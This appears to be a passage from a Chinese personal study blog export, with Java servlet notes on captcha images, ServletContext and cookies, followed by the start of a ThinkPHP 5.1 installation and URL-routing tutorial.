&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基本上和字符输出一致，只不过使用方法不同</p>
<h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><ol>
<li><p>本质：图片</p>
</li>
<li><p>目的： 防止恶意表单注册</p>
</li>
</ol>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line">import javax.imageio.ImageIO;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.awt.*;</span><br><span class="line">import java.awt.image.BufferedImage;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Random;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> CheckCodeServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Post(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//1.创建一个对象，在内存中图片(验证码的图片对象)</span></span><br><span class="line">        <span class="built_in">int</span> width=<span class="number">100</span>;</span><br><span class="line">        <span class="built_in">int</span> height=<span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">        BufferedImage image=<span class="keyword">new</span> <span class="constructor">BufferedImage(<span class="params">width</span>,<span class="params">height</span>,BufferedImage.TYPE_INT_RGB)</span>;</span><br><span class="line">        <span class="comment">//2.美化图片</span></span><br><span class="line">        <span class="comment">//2.1 填充背景色</span></span><br><span class="line">        Graphics g = image.get<span class="constructor">Graphics()</span>;<span class="comment">//画笔对象</span></span><br><span class="line">        g.set<span class="constructor">Color(Color.<span class="params">pink</span>)</span>;<span class="comment">//设置画笔颜色</span></span><br><span class="line">        g.fill<span class="constructor">Rect(0,0,<span class="params">width</span>,<span class="params">height</span>)</span>;</span><br><span class="line">        <span class="comment">//2.2 画边框</span></span><br><span class="line">        g.set<span class="constructor">Color(Color.BLUE)</span>;</span><br><span class="line">        g.draw<span class="constructor">Rect(0,0,<span class="params">width</span>-1,<span class="params">height</span>-1)</span>;</span><br><span class="line"></span><br><span class="line">        String str=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>;</span><br><span class="line">        <span class="comment">//生成随机角标</span></span><br><span class="line">        Random ran=<span class="keyword">new</span> <span class="constructor">Random()</span>;</span><br><span class="line"></span><br><span class="line">        for (<span class="built_in">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">int</span> index = ran.next<span class="constructor">Int(<span class="params">str</span>.<span class="params">length</span>()</span>);</span><br><span class="line">            <span class="comment">//获取字符</span></span><br><span class="line">            <span class="built_in">char</span> ch = str.<span class="built_in">char</span><span class="constructor">At(<span class="params">index</span>)</span>;<span class="comment">//随即字符</span></span><br><span class="line">            <span class="comment">//2.3 写验证码</span></span><br><span class="line">            g.draw<span class="constructor">String(<span class="params">ch</span>+<span class="string">""</span>,<span class="params">width</span><span class="operator">/</span>5<span class="operator">*</span><span class="params">i</span>,<span class="params">height</span><span class="operator">/</span>2)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.4画干扰线</span></span><br><span class="line">        g.set<span class="constructor">Color(Color.GREEN)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//随机生成坐标点</span></span><br><span class="line">        for(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">int</span> x1 = ran.next<span class="constructor">Int(<span class="params">width</span>)</span>;</span><br><span class="line">            <span class="built_in">int</span> x2 = ran.next<span class="constructor">Int(<span class="params">width</span>)</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span> y1=ran.next<span class="constructor">Int(<span class="params">height</span>)</span>;</span><br><span class="line">            <span class="built_in">int</span> y2 = ran.next<span class="constructor">Int(<span class="params">height</span>)</span>;</span><br><span class="line">            g.draw<span class="constructor">Line(<span class="params">x1</span>,<span class="params">x2</span>,<span class="params">y1</span>,<span class="params">y2</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3.将图片输出到页面展示</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">ImageIO</span>.</span></span>write(image,<span class="string">"jpg"</span>,response.get<span class="constructor">OutputStream()</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Get(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        this.<span class="keyword">do</span><span class="constructor">Post(<span class="params">request</span>, <span class="params">response</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们每刷新一次就会变一次</p>
<h1 id="ServletContext对象"><a href="#ServletContext对象" class="headerlink" title="ServletContext对象"></a>ServletContext对象</h1><ol>
<li><p>概念：代表整个web应用，可以和程序的容器(服务器)来通信</p>
</li>
<li><p>获取：</p>
<ol>
<li><p>通过request对象来获取 request.getServletContext();</p>
</li>
<li><p>通过HttpServlet获取 this.getServletContext();</p>
</li>
</ol>
</li>
<li><p>功能：</p>
<ol>
<li><p>获取MIME类型</p>
<ul>
<li><p>MIME类型：在互联网通信过程中定义的一种文件数据类型</p>
</li>
<li><p>格式： 大类型/小类型 text/html image/jpeg </p>
</li>
<li><p>获取：String getMimeType(String file)</p>
</li>
</ul>
</li>
<li><p>域对象：共享数据</p>
<ol>
<li><p>setAttribute(String name,Object value)</p>
</li>
<li><p>getAttribute(String name)</p>
</li>
<li><p>removeAttribute(String name)</p>
</li>
</ol>
</li>
<li><p>获取文件的真实(服务器)路径</p>
</li>
</ol>
</li>
</ol>
<h2 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servletcontext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletContext</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Context1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">/**ServletContext对象获取</span></span><br><span class="line"><span class="comment">         * 1.通过request对象获取</span></span><br><span class="line"><span class="comment">         * request.getServletContext();</span></span><br><span class="line"><span class="comment">         * 2. 通过HttpServlet获取</span></span><br><span class="line"><span class="comment">         * this.getServletContext();</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 通过request对象获取</span></span><br><span class="line">        <span class="type">ServletContext</span> context1= request.getSession().getServletContext();</span><br><span class="line">        <span class="comment">//2. 通过HttpServlet获取</span></span><br><span class="line">        <span class="type">ServletContext</span> context2 = <span class="keyword">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">System</span>.out.println(context1==context2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><br>证明两个获取方式是一样的</p>
<h2 id="获取MIME类型"><a href="#获取MIME类型" class="headerlink" title="获取MIME类型"></a>获取MIME类型</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servletcontext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletContext</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Context1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">/**ServletContext对象获取</span></span><br><span class="line"><span class="comment">         * 1.通过request对象获取</span></span><br><span class="line"><span class="comment">         * request.getServletContext();</span></span><br><span class="line"><span class="comment">         * 2. 通过HttpServlet获取</span></span><br><span class="line"><span class="comment">         * this.getServletContext();</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //1. 通过request对象获取</span></span><br><span class="line"><span class="comment">//        ServletContext context1= request.getSession().getServletContext();</span></span><br><span class="line">        <span class="comment">//2. 通过HttpServlet获取</span></span><br><span class="line">        <span class="type">ServletContext</span> context = <span class="keyword">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 定义文件名称</span></span><br><span class="line">        <span class="type">String</span> filename=<span class="string">"a.jpg"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.获取MIME类型</span></span><br><span class="line">        <span class="type">String</span> mimeType = context.getMimeType(filename);</span><br><span class="line">        <span class="type">System</span>.out.println(mimeType);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">image</span>/jpeg</span><br></pre></td></tr></table></figure></p>
<p>可以在web.xml中查看更多mime类型</p>
<h2 id="域对象"><a href="#域对象" class="headerlink" title="域对象"></a>域对象</h2><p>context1<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servletcontext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletContext</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Context1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">/**ServletContext对象获取</span></span><br><span class="line"><span class="comment">         * 1.通过request对象获取</span></span><br><span class="line"><span class="comment">         * request.getServletContext();</span></span><br><span class="line"><span class="comment">         * 2. 通过HttpServlet获取</span></span><br><span class="line"><span class="comment">         * this.getServletContext();</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //1. 通过request对象获取</span></span><br><span class="line"><span class="comment">//        ServletContext context1= request.getSession().getServletContext();</span></span><br><span class="line">        <span class="comment">//2. 通过HttpServlet获取</span></span><br><span class="line">        <span class="type">ServletContext</span> context = <span class="keyword">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置数据</span></span><br><span class="line">        context.setAttribute(<span class="string">"msg"</span>,<span class="string">"haha"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>context2<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servletcontext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletContext</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Context2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">/**ServletContext对象获取</span></span><br><span class="line"><span class="comment">         * 1.通过request对象获取</span></span><br><span class="line"><span class="comment">         * request.getServletContext();</span></span><br><span class="line"><span class="comment">         * 2. 通过HttpServlet获取</span></span><br><span class="line"><span class="comment">         * this.getServletContext();</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //1. 通过request对象获取</span></span><br><span class="line"><span class="comment">//        ServletContext context1= request.getSession().getServletContext();</span></span><br><span class="line">        <span class="comment">//2. 通过HttpServlet获取</span></span><br><span class="line">        <span class="type">ServletContext</span> context = <span class="keyword">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        <span class="type">Object</span> msg = context.getAttribute(<span class="string">"msg"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们并没有做任何的转发或者重定向的操作</p>
<p>只需要先访问context1设置键值对，再访问context2便会有了</p>
<p>也就是共享了所有用户的请求数据，这个对象很不安全，而且生命周期长，容易造成内存占用大和一系列安全问题</p>
<h2 id="获取文件服务路径"><a href="#获取文件服务路径" class="headerlink" title="获取文件服务路径"></a>获取文件服务路径</h2><ul>
<li>方法：String getRealPath(String path);</li>
</ul>
<p>分别在src,web,和WEB-INF下创建三个文件，分别为a.txt,b.txt,c.txt</p>
<p>以b.txt为例<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servletcontext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletContext</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">File</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Context3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">/**ServletContext对象获取</span></span><br><span class="line"><span class="comment">         * 1.通过request对象获取</span></span><br><span class="line"><span class="comment">         * request.getServletContext();</span></span><br><span class="line"><span class="comment">         * 2. 通过HttpServlet获取</span></span><br><span class="line"><span class="comment">         * this.getServletContext();</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //通过request对象获取</span></span><br><span class="line"><span class="comment">//        ServletContext context1= request.getSession().getServletContext();</span></span><br><span class="line">        <span class="comment">//通过HttpServlet获取</span></span><br><span class="line">        <span class="type">ServletContext</span> context = <span class="keyword">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取文件的服务器路径</span></span><br><span class="line">        <span class="type">String</span> realPath = context.getRealPath(<span class="string">"/b.txt"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(realPath);</span><br><span class="line">        <span class="type">File</span> file=<span class="keyword">new</span> <span class="type">File</span>(realPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">F</span>:\<span class="selector-tag">apache-tomcat-8</span><span class="selector-class">.5</span><span class="selector-class">.57-windows-x64</span>\<span class="selector-tag">apache-tomcat-8</span><span class="selector-class">.5</span><span class="selector-class">.57</span>\<span class="selector-tag">webapps</span>\<span class="selector-tag">response</span>\<span class="selector-tag">b</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><br>c.txt只需要改为<code>/WEB-INF/c.txt</code></p>
<p>a.txt比较麻烦，src下的所有东西都将放到WEB-INF下的classes,需要改为<code>/WEB-INF/classes/a.txt</code></p>
<h1 id="会话技术"><a href="#会话技术" class="headerlink" title="会话技术"></a>会话技术</h1><ol>
<li><p>会话：一次会话中包含多次请求和响应</p>
<ul>
<li>一次会话：浏览器第一次给服务器资源发送请求，会话建立，直到有一方断开为止</li>
</ul>
</li>
<li><p>功能：在一次会话的范围内，共享数据</p>
</li>
<li><p>方式：</p>
<ol>
<li><p>客户端会话技术：Cookie</p>
</li>
<li><p>服务器端会话技术：Session</p>
</li>
</ol>
</li>
</ol>
<h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><ul>
<li><p>使用步骤：</p>
<ol>
<li><p>创建Cookie对象 new Cookie(String name,String value)</p>
</li>
<li><p>发送Cookie对象 response.addCookie(Cookie cookie)</p>
</li>
<li><p>获取Cookie对象，拿到数据 Cookie[] request.getCookies()</p>
</li>
</ol>
</li>
</ul>
<p>demo1创建并发送Cookie<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">Cookie</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Cookie快速入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建Cookie</span></span><br><span class="line">        <span class="type">Cookie</span> c=<span class="keyword">new</span> <span class="type">Cookie</span>(<span class="string">"msg"</span>,<span class="string">"hello"</span>);</span><br><span class="line">        <span class="comment">//2.发送Coookie</span></span><br><span class="line">        response.addCookie(c);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>demo2获取Cookie<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">Cookie</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//3.获取Cookie</span></span><br><span class="line">        <span class="type">Cookie</span>[] cs = request.getCookies();</span><br><span class="line">        <span class="comment">//遍历Cookie</span></span><br><span class="line">        <span class="keyword">if</span>(cs!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">Cookie</span> c : cs) &#123;</span><br><span class="line">                <span class="type">String</span> name = c.getName();</span><br><span class="line">                <span class="type">String</span> value = c.getValue();</span><br><span class="line">                <span class="type">System</span>.out.println(name +<span class="string">" : "</span>+ value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先访问demo1，再放问demo2<br>运行结果<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">JSESSIONID : <span class="type">B0644875B54B93E70FF232624A6F4FA6</span></span><br><span class="line">msg : <span class="type">hello</span></span><br><span class="line">Phpstorm-d069594e : 0<span class="type">d583fa6</span>-ad80-<span class="number">4735</span>-a385-c10cee7ee32f</span><br></pre></td></tr></table></figure><br>第一个和最后一个都是自带的，不用管，msg是获取到了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/31-ThinkPHP-1</title>
    <url>/2020/07/31/PHP-2020-7-31-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官方已经不提供软件包下载了，采用Composer和git方式下载和更新</p>
<p>首先去官网下载composer，傻瓜安装之后，把你刚才添加的PHP的目录添加的系统PATH中，之后重启电脑，输入composer运行是否正常</p>
<p>接着在cmd中输入<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">composer <span class="built_in">config</span> -g repo.packagist composer https:<span class="comment">//mirrors.aliyun.com/composer/</span></span><br></pre></td></tr></table></figure><br>配置好composer</p>
<p>切换到WWW目录下输入<br><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="string">topthink/</span><span class="string">think=</span>5.1.* <span class="string">tp5.</span><span class="string">1test</span></span><br></pre></td></tr></table></figure><br>等待创建即可</p>
<p>创建完毕之后，访问<a href="http://localhost/thinkphp5/tp5.1test/public/" target="_blank" rel="noopener">http://localhost/thinkphp5/tp5.1test/public/</a></p>
<p>我是因为创建了thinkphp5，所以才有这样的目录，根据自身情况而进行修改，如果进去看到了ThinkPHP的默认界面，就成功创建了</p>
<p>如果你需要更新你的项目版本，进入根目录输入<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">composer <span class="keyword">update</span> topthink/framework</span><br></pre></td></tr></table></figure><br>接下来用编译器打开就行了</p>
<h2 id="URL解析模式"><a href="#URL解析模式" class="headerlink" title="URL解析模式"></a>URL解析模式</h2><ol>
<li><p>ThinkPHP框架非常多的操作都是通过URL来实现的</p>
</li>
<li><p><a href="http://serverName/index.php/模块/控制器/操作/参数/值" target="_blank" rel="noopener">http://serverName/index.php/模块/控制器/操作/参数/值</a>…</p>
</li>
<li><p>index.php为入口文件，在public目录内的index.php文件</p>
</li>
<li><p>模块在application目录下默认有一个index目录，这就是一个模块</p>
</li>
<li><p>在index目录下有一个controller控制器目录的Index.php控制器</p>
</li>
<li><p>Index.php控制器的类名也必须是class Index，否则错误</p>
</li>
<li><p>操作就是控制器class Index中的方法，比如index或hello</p>
</li>
<li><p>完整形式为public/index.php/index/index/index</p>
</li>
</ol>
<p>创建一个自己的模块，在application中创建一个test模块，并且在下面创建必要的controller目录，接着创建Abc.php并在里面写上class Abc，别忘记命名空间</p>
<p><img src="/img/PHP/thinkphp/7-31/0.png" alt="avatar"></p>
